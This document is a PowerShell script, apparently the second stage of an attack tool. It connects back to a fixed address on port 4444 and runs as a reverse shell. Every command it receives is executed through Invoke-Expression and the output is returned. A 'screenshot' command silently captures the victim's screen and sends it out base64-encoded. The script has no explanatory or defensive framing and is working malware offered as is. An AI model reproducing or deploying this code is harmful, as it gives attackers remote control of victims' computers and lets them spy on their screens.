# --- PHASE 2: CONNECTION + SCREENSHOT ---
$ip = '192.168.1.15'
$port = 4444

# Load necessary assemblies for graphics
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Clean Screenshot Function
function Get-Screenshot {
    try {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $ms = New-Object System.IO.MemoryStream
        $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $base64 = [Convert]::ToBase64String($ms.ToArray())
        
        $graphic.Dispose(); $bitmap.Dispose(); $ms.Dispose()
        return $base64
    } catch { return "Error capturing screen: $($_.Exception.Message)" }
}

try {
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    $writer.WriteLine("--- Phase 2 Active: Screenshot Enabled ---")
    $writer.Write("PS " + (Get-Location).Path + "> ")

    while($client.Connected) {
        $input = $reader.ReadLine()
        if ([string]::IsNullOrWhiteSpace($input)) { continue }
        if ($input -eq "exit") { break }

        # LOGIC: Check if the user typed 'screenshot'
        if ($input -eq "screenshot") {
            $out = Get-Screenshot
        } else {
            $out = try { Invoke-Expression $input 2>&1 | Out-String } catch { $_.Exception.Message }
        }

        $writer.WriteLine($out)
        $writer.Write("PS " + (Get-Location).Path + "> ")
    }
} catch {
    Write-Error "Connection lost or failed: $($_.Exception.Message)"
} finally {
    if ($client) { $client.Close() }
}
